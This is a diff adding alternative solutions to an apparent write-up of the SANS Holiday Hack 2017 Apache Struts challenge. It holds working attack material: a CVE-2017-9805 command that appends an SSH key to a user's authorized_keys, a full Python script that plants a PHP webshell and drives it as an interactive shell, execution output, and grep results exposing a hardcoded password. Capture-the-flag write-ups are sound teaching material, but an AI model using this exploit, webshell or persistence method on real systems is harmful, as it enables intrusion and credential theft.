@@ -241,20 +241,144 @@ On the Topic of Flying Animals
    :CUSTOM_ID: alternatives
    :END:
 
-  * TODO ripgrep
-  * TODO SSH key method
+*** Add an authorized_key
+
+One thing you can do if you don't have the password yet is actually add an ssh key to alabaster's authorized keys file. This is problematic since you need to know that the username is actually =alabaster_snowball= first. Assuming you do, you can run the following command to add your key to the file.
+
+#+BEGIN_SRC sh
+./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "echo ssh-rsa VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo= holiday@hack | tee -a /home/alabaster_snowball/.ssh/authorized_keys"
+#+END_SRC
+
+Then you can ssh using your private key identity file.
+
+#+BEGIN_SRC sh
+holiday@hack:~$ ssh -i /home/holiday/.ssh/sans_2017 alabaster_snowball@l2s.northpolechristmastown.com
+alabaster_snowball@l2s:/tmp/asnow.xq1pCkwT7LUy3iLl0AaBCc7D$ grep -A1 -R / -e alabaster_snowball
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = "alabaster_snowball";
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-            final String password = "stream_unhappy_buy_loss";
+#+END_SRC
+
+Once in you are in a restricted shell but you can try to grep for alabaster's password but a regular grep against the entire system will take about 1 minute then you have to parse through the results.
+
+*** Automate the webshell
+
+We can automate dropping a webshell and creating a mini shell to query it. Assuming we have [[https://github.com/chrisjd20/cve-2017-9805.py]] in the same directory we can create a script to automate expoloitation and give us a prompt to execute commands.
+
+#+BEGIN_SRC sh
+#!/usr/bin/env python
+from __future__ import print_function
+
+import base64
+import requests
+import sys
+
+from cve_2017_9805 import main as struts_exploit
+
+VULNERABLE_ENDPOINT = "https://dev.northpolechristmastown.com/orders.xhtml"
+BASE_URL = "https://l2s.northpolechristmastown.com/"
+WEBSHELL = "4beadb1e-5ddb-4636-98a4-c2dac0f79ab3.php"
+WEBSHELL_PAYLOAD = b'<?php system($_GET[cmd]); ?>\n'
+WEBSHELL_PAYLOAD_ENCODED = base64.encodestring(WEBSHELL_PAYLOAD).strip()
+
+## Emulate this command:
+## /cve-2017-9805.py -c 'echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo= | base64 -d > /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php' -u https://dev.northpolechristmastown.com/orders.xhtml
+EXPLOIT_COMMAND = "echo {} | base64 -d > /var/www/html/{}".format(WEBSHELL_PAYLOAD_ENCODED, WEBSHELL)
+
+def run_command(command):
+    url = BASE_URL + WEBSHELL
+    request = requests.get(url, params={"cmd":command})
+    if request.status_code == 404:
+        return None
+    return request.text
+
+#Main function
+def setup():
+    # See if we can run the id command, and if so, we are good to go...
+    out = run_command('id')
+    if out and 'uid=' in out:
+        return True
+    sys.stderr.write("The webshell did not exist, re-exploiting.....\n")
+    struts_exploit(VULNERABLE_ENDPOINT, EXPLOIT_COMMAND)
+    out = run_command('id')
+    if out and 'uid=' in out:
+        return True
+    sys.stderr.write("The struts exploit/webshell failed :-(\n")
+    sys.exit(1)
+
+def interactive():
+    setup()
+    while True:
+        try:
+            cmd = raw_input("www-data@l2s:$ ")
+        except EOFError:
+            print()
+            return
+        print(run_command(cmd))
+
+def one_shot(command):
+    setup()
+    print(run_command(command))
+
+if __name__ == "__main__":
+    if sys.argv[1:]:
+        one_shot(' '.join(sys.argv[1:]))
+    else:
+        interactive()
+#+END_SRC
+
+First we need to either rename =cve-2017-9805.py= to =cve_2017_9805.py= or create a symlink so it can be properly imported into our script. Then we can easily execute commands on l2s.
+
+#+BEGIN_SRC sh
+holiday@hack:~$ ./l2s.py id
+The webshell did not exist, re-exploiting.....
+[+] Encoding Command
+[+] Building XML object
+[+] Placing command in XML object
+[+] Converting Back to String
+[+] Making Post Request with our payload
+[+] Payload executed
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+holiday@hack:~$ ./l2s.py uname -a
+Linux hhc17-apache-struts1 4.9.0-5-amd64 #1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64 GNU/Linux
+
+holiday@hack:~$./l2s.py
+www-data@l2s:$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@l2s:$ uname -a
+Linux hhc17-apache-struts1 4.9.0-5-amd64 #1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64 GNU/Linux
+#+END_SRC
+
+*** Search even faster with ripgrep
+
+Ripgrep is a super fast grep replacement written in rust. It does a better job at filtering binary files, so we can run this command that finishes in about a second:
+
+The following steps create a folder for ripgrep and executes the search.
+
+#+BEGIN_SRC sh
+www-data@l2s:$ mkdir /tmp/.rg
+www-data@l2s:$ wget -q -O - https://github.com/BurntSushi/ripgrep/releases/download/0.7.1/ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz | tar xzf - -C /tmp/.rg/
+www-data@l2s:$ find / -type f -xdev -user alabaster_snowball 2>/dev/null | xargs /tmp/.rg/ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster -A 1
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = "alabaster_snowball";
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-            final String password = "stream_unhappy_buy_loss";
+#+END_SRC
 
 ** Common Pitfalls
    :PROPERTIES:
    :CUSTOM_ID: common-pitfalls
    :END:
 
-Do we know what issue(s) people were running into?
+A common pitfall is the blind injection aspect of the Apache Struts exploit.
 
 ** About the Challenge
    :PROPERTIES:
    :CUSTOM_ID: about-the-challenge
    :END:
 
-How was the challenge setup? Was there a better way to secure this
-system?
+Initially the host has a couple of noticeable holes.
+
+  * Apache server running as alabaster (eventually changed to www-data user)
+  * Easy bypass of rbash by adding the '-t' flag and executing bash on ssh login (eventually rbash was forced through sshd_config)
+
+The server itself housed two virtual web hosts, the Letter's to Santa application which ran PHP in nginx and the Development site which was run by apache struts on a high port being redirected by nginx.
